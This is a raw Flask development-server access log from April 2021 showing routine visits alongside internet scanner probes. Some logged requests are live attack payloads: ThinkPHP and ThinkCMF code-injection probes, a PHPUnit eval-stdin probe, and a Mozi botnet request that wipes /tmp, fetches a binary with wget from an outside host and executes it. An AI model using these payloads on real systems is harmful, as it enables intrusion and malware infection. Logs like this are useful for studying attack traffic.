 * Serving Flask app "makemyday" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
 * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
45.155.205.211 - - [15/Apr/2021 11:45:35] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:36] "[33mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:36] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:36] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:36] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
45.155.205.211 - - [15/Apr/2021 11:45:36] "[37mGET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1[0m" 200 -
45.155.205.211 - - [15/Apr/2021 11:45:37] "[37mGET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1[0m" 200 -
34.220.222.204 - - [15/Apr/2021 12:10:10] "[37mGET / HTTP/1.1[0m" 200 -
34.216.113.145 - - [15/Apr/2021 12:11:11] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.37 - - [15/Apr/2021 12:41:37] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.37 - - [15/Apr/2021 12:41:37] "[37mGET / HTTP/1.1[0m" 200 -
193.118.53.210 - - [15/Apr/2021 13:16:49] "[37mGET / HTTP/1.1[0m" 200 -
46.101.40.190 - - [15/Apr/2021 14:01:38] "[37mGET / HTTP/1.0[0m" 200 -
103.216.186.241 - - [15/Apr/2021 14:26:55] "[37mGET / HTTP/1.1[0m" 200 -
128.14.134.134 - - [15/Apr/2021 14:41:24] "[37mGET / HTTP/1.1[0m" 200 -
120.85.92.138 - - [15/Apr/2021 14:49:42] "[33mPOST /HNAP1/ HTTP/1.0[0m" 404 -
192.241.208.108 - - [15/Apr/2021 15:58:31] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 16:00:37] "[37mGET / HTTP/1.1[0m" 200 -
178.175.123.105 - - [15/Apr/2021 16:00:45] "[33mGET /shell?cd+/tmp;rm+-rf+*;wget+http://178.175.123.105:47612/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1[0m" 404 -
73.170.49.174 - - [15/Apr/2021 16:01:49] "[37mGET / HTTP/1.1[0m" 200 -
212.47.244.68 - - [15/Apr/2021 16:16:59] "[37mGET http://www.bing.com/ HTTP/1.1[0m" 200 -
212.47.244.68 - - [15/Apr/2021 16:16:59] "[33mCONNECT www.bing.com:443 HTTP/1.1[0m" 404 -
212.47.244.68 - - [15/Apr/2021 16:17:00] "[33mPOST http://suzancutlip.fun/6149dcbdba441770e5252e2751d8a634292014d38a26274c4f0ba587b59f3c0770be8854c69267d75c4f0915298bca5bb4a5842664ebcc88712501a53a218a1d98f6cc5602a74d639ab8d1af799036806bfa6f72a982c9f1cd4d8f0b6ec8b446 HTTP/1.1[0m" 404 -
162.142.125.55 - - [15/Apr/2021 16:21:18] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.55 - - [15/Apr/2021 16:21:18] "[37mGET / HTTP/1.1[0m" 200 -
212.69.18.1 - - [15/Apr/2021 16:33:00] "[37mGET / HTTP/1.1[0m" 200 -
209.141.45.200 - - [15/Apr/2021 16:35:44] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
209.141.54.113 - - [15/Apr/2021 16:54:30] "[33mGET /index.html HTTP/1.1[0m" 404 -
202.172.26.17 - - [15/Apr/2021 17:15:24] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
107.151.182.54 - - [15/Apr/2021 18:38:30] "[37mGET / HTTP/1.1[0m" 200 -
159.65.236.108 - - [15/Apr/2021 19:24:40] "[33mPOST /b65f8b5/u4bz1zb7mg829x14/ HTTP/1.1[0m" 404 -
135.181.196.36 - - [15/Apr/2021 20:01:00] "[37mHEAD / HTTP/1.1[0m" 200 -
135.181.196.36 - - [15/Apr/2021 20:01:00] "[37mGET / HTTP/1.1[0m" 200 -
209.17.96.34 - - [15/Apr/2021 20:32:56] "[37mGET / HTTP/1.0[0m" 200 -
162.142.125.40 - - [15/Apr/2021 21:13:54] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.40 - - [15/Apr/2021 21:13:54] "[37mGET / HTTP/1.1[0m" 200 -
88.5.237.10 - - [15/Apr/2021 21:15:40] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 21:16:43] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 21:16:50] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 21:18:22] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 21:19:28] "[37mGET / HTTP/1.1[0m" 200 -
73.170.49.174 - - [15/Apr/2021 21:19:29] "[37mGET /static/favicon.ico HTTP/1.1[0m" 200 -
